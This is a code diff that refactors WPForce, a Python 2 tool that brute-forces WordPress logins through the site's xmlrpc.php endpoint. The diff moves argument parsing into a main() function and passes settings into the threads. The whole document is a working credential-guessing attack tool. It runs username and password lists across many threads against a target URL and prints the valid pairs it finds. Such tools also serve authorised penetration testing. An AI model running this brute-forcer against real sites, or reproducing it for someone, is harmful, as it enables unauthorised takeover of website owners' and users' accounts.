@@ -46,8 +46,9 @@ def slice_list(input, size):
     return result
 
 
-def worker(wordlist,thread_no,url):
+def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
     global total
+    global correct_pairs
     for n in wordlist:
         current_pass = wordlist.index(n)
         for x in userlist:
@@ -55,12 +56,12 @@ def worker(wordlist,thread_no,url):
             user = userlist[current_user]
             password = wordlist[current_pass]
             if user not in correct_pairs:
-                PasswordAttempt(user,password,url,thread_no)
+                PasswordAttempt(user,password,url,thread_no,verbose,debug,agent)
         total += 1
 
 
-def BuildThreads(list_array,url):
-    if args.debug == True:
+def BuildThreads(list_array,url,debug,userlist,verbose,agent):
+    if debug == True:
         print "Here is the content of the wordlists for each thread"
         for i in range(len(list_array)):
             print "Thread " + str(i)
@@ -68,13 +69,13 @@ def BuildThreads(list_array,url):
             print "\n-----------------------------------------------------"
     threads = []
     for i in range(len(list_array)):
-        t = threading.Thread(target=worker, args=(list_array[i], i, url))
+        t = threading.Thread(target=worker, args=(list_array[i], i, url,userlist,verbose,debug,agent))
         t.daemon = True
         threads.append(t)
         t.start()
 
 
-def PrintBanner():
+def PrintBanner(input,wordlist,url,userlist,passlist):
     banner = """\
        ,-~~-.___.       __        __ ____   _____
       / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
@@ -86,13 +87,13 @@ def PrintBanner():
      =(  _____||________|                 ~n00py~
     """
     print banner
-    print ("Username List: %s" % args.input) + " (" + str(len(userlist)) + ")"
-    print ("Password List: %s" % args.wordlist) + " (" + str(len(passlist)) + ")"
-    print ("URL: %s" % args.url)
+    print ("Username List: %s" % input) + " (" + str(len(userlist)) + ")"
+    print ("Password List: %s" % wordlist) + " (" + str(len(passlist)) + ")"
+    print ("URL: %s" % url)
 
 
 def TestSite(url):
-    protocheck()
+    protocheck(url)
     print "Trying: " + url
     try:
         urllib2.urlopen(url, timeout=3)
@@ -113,13 +114,13 @@ def TestSite(url):
         sys.exit()
 
 
-def PasswordAttempt(user, password, url, thread_no):
-    if args.verbose is True or args.debug is True:
-        if args.debug is True:
+def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
+    if verbose is True or debug is True:
+        if debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
         print "Trying " + user + " : " + password + "\n",
-    headers = {'User-Agent': args.agent,
+    headers = {'User-Agent': agent,
                'Connection': 'keep-alive',
                'Accept': 'text/html'
                }
@@ -166,38 +167,42 @@ def PasswordAttempt(user, password, url, thread_no):
         sys.exit()
 
 
-def protocheck():
-    if "http" not in args.url:
+def protocheck(url):
+    if "http" not in url:
         printout("Please include the protocol in the URL\n", YELLOW)
         sys.exit()
+def main():
+    parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
+    parser.add_argument('-i','--input', help='Input file name',required=True)
+    parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
+    parser.add_argument('-u','--url',help='URL of target', required=True)
+    parser.add_argument('-v','--verbose',help=' Verbose output.  Show the attemps as they happen.', required=False, action='store_true')
+    parser.add_argument('-t','--threads',help=' Determines the number of threads to be used, default is 10', type=int, default=10, required=False)
+    parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
+    parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
+    args = parser.parse_args()
+    url = args.url + '/xmlrpc.php'
+    u = open(args.input, 'r')
+    userlist = u.read().split('\n')
+    totalusers = len(userlist)
+    f = open(args.wordlist, 'r')
+    passlist = f.read().split('\n')
+    PrintBanner(args.input,args.wordlist,args.url,userlist,passlist)
+    TestSite(url)
 
-parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
-parser.add_argument('-i','--input', help='Input file name',required=True)
-parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
-parser.add_argument('-u','--url',help='URL of target', required=True)
-parser.add_argument('-v','--verbose',help=' Verbose output.  Show the attemps as they happen.', required=False, action='store_true')
-parser.add_argument('-t','--threads',help=' Determines the number of threads to be used, default is 10', type=int, default=10, required=False)
-parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
-parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script.', action='store_true', required=False)
-args = parser.parse_args()
-url = args.url + '/xmlrpc.php'
-u = open(args.input, 'r')
-userlist = u.read().split('\n')
-totalusers = len(userlist)
-f = open(args.wordlist, 'r')
-passlist = f.read().split('\n')
-correct_pairs = {}
-total = 0
-PrintBanner()
-TestSite(url)
+    list_array = slice_list(passlist, args.threads)
+    BuildThreads(list_array,url,args.debug,userlist,args.verbose,args.agent)
+    while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
+            time.sleep(0.1)
+            sys.stdout.flush()
+            percent = "%.0f%%" % (100 * (total)/len(passlist))
+            print " " + percent + " Percent Complete\r",
+    print "\nAll correct pairs:"
+    printout(str(correct_pairs), GREEN)
+    print ""
 
-list_array = slice_list(passlist, args.threads)
-BuildThreads(list_array,url)
-while (len(correct_pairs) <= totalusers) and (len(passlist) > total):
-        time.sleep(0.1)
-        sys.stdout.flush()
-        percent = "%.0f%%" % (100 * (total)/len(passlist))
-        print " " + percent + " Percent Complete\r",
-print "\nAll correct pairs:"
-printout(str(correct_pairs), GREEN)
-print ""
+if __name__ == "__main__":
+    # These variables must be shared by all threads dynamically
+    correct_pairs = {}
+    total = 0
+    main()
